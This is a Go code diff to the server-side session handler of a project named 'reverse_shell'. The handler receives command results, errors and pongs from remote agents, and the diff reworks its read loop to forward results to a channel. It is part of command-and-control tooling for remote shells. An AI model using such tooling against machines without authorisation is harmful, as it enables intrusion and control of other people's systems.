@@ -6,7 +6,6 @@ import (
 	"os"
 	"reverse_shell/pkg/common"
 	"reverse_shell/pkg/protocol"
-	"time"
 
 	"go.uber.org/zap"
 )
@@ -50,32 +49,37 @@ func HandleNewConnection(conn net.Conn, sessionManager *SessionManager, logger *
 
 	logger.Info("New session created", zap.String("sessionID", session.ID), zap.String("agentID", session.AgentID))
 
-	go func() {
-		defer sessionManager.Remove(session.ID)
-		for {
-			conn.SetReadDeadline(time.Now().Add(2 * time.Minute))
-			msg, err := codec.Read()
-			if err != nil {
-				logger.Error("Error reading message", zap.String("sessionID", session.ID), zap.Error(err))
-				return
-			}
-			logger.Info("Message received", zap.String("sessionID", session.ID), zap.String("messageType", msg.Type))
-			sessionManager.Touch(session.ID)
-
-			switch msg.Type {
-			case protocol.MsgResult:
-				logger.Info("Command output received", zap.String("sessionID", session.ID), zap.String("output", msg.Payload))
-			case protocol.MsgError:
-				logger.Error("Error message from agent", zap.String("sessionID", session.ID), zap.String("error", msg.Payload))
-			case protocol.MsgPong:
-				logger.Info("Pong received", zap.String("sessionID", session.ID))
-			default:
-				logger.Warn("Unknown message type", zap.String("sessionID", session.ID), zap.String("messageType", msg.Type))
-			}
+	defer sessionManager.Remove(session.ID)
+	for {
+		msg, err := codec.Read()
+		if err != nil {
+			logger.Error("Error reading message", zap.String("sessionID", session.ID), zap.Error(err))
+			return err
 		}
-	}()
-	return nil
+		logger.Info("Message received", zap.String("sessionID", session.ID), zap.String("messageType", msg.Type))
+		sessionManager.Touch(session.ID)
 
+		switch msg.Type {
+		case protocol.MsgResult:
+			logger.Info("Command output received", zap.String("sessionID", session.ID), zap.String("output", msg.Payload))
+			select {
+			case session.ResultChan <- msg:
+			default:
+				logger.Warn("Result channel full, dropping message", zap.String("sessionID", session.ID))
+			}
+		case protocol.MsgError:
+			logger.Error("Error message from agent", zap.String("sessionID", session.ID), zap.String("error", msg.Payload))
+			select {
+			case session.ResultChan <- msg:
+			default:
+				logger.Warn("Result channel full, dropping error", zap.String("sessionID", session.ID))
+			}
+		case protocol.MsgPong:
+			logger.Info("Pong received", zap.String("sessionID", session.ID))
+		default:
+			logger.Warn("Unknown message type", zap.String("sessionID", session.ID), zap.String("messageType", msg.Type))
+		}
+	}
 }
 
 func validateAuthPayload(payload string) bool {
